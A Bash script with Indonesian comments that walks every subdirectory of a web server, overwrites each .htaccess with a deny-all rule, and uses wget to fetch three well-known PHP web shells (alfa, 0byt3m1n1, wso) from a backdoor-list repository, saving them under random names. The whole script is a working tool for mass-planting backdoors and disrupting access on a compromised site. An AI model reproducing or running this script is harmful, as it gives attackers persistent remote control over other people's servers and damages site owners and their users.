#!/bin/bash

# Fungsi untuk mengecek setiap direktori dan melakukan aksi berdasarkan izinnya
checkAndPlaceHtaccess() {
    local dirPath="$1"
    local htaccessContent="Order Deny,Allow\nDeny from all"

    # Coba tempatkan atau timpa file .htaccess
    local htaccessPath="${dirPath}/.htaccess"
    if echo -e "$htaccessContent" > "$htaccessPath" 2>/dev/null; then
        # Jika berhasil, tampilkan pesan dengan warna hijau
        echo -e "\033[32mFile .htaccess telah ditambahkan atau ditimpa di: $htaccessPath\033[0m"
    else
        # Jika gagal, tampilkan pesan dengan warna merah
        echo -e "\033[31mDirektori tidak dapat diakses atau .htaccess tidak dapat ditimpa: $dirPath\033[0m"
    fi

    sleep 1 # Penundaan antara operasi untuk mencegah overload
}

# Fungsi untuk mengunduh dan mengubah nama file php
downloadAndRenamephp() {
    local dirPath="$1"
    # Mendefinisikan array dengan URL untuk setiap file php
    local phpUrls=(
        "https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/php/alfa.php"
        "https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/php/0byt3m1n1.php"
        "https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/php/wso.php"
    )

    # Loop melalui setiap URL dalam array phpUrls untuk mengunduh setiap file php
    for ((i=0; i<${#phpUrls[@]}; i++)); do
        local tempFile=$(mktemp "${dirPath}/XXXXXXXX.php")
        wget -q -O "$tempFile" "${phpUrls[i]}" && echo -e "\033[33mFile php terunduh dan disimpan sebagai: $tempFile\033[0m"
        sleep 1 # Penundaan 3 detik antara pengunduhan
    done
}

# Fungsi rekursif untuk menelusuri direktori
recurseDirectories() {
    local currentDir="$1"
    # Loop melalui setiap item dalam direktori
    for item in "$currentDir"/*; do
        if [ -d "$item" ]; then
            # Jika item adalah direktori, cek dan tempatkan .htaccess jika perlu
            checkAndPlaceHtaccess "$item"

            # Mengunduh dan mengubah nama file php
            downloadAndRenamephp "$item"

            # Rekursi ke dalam direktori
            recurseDirectories "$item"
        fi
    done
}

# Mulai dari direktori skrip ini berada atau direktori yang diberikan
startDir=${1:-$(pwd)}

# Panggil fungsi utama dengan direktori awal
recurseDirectories "$startDir"
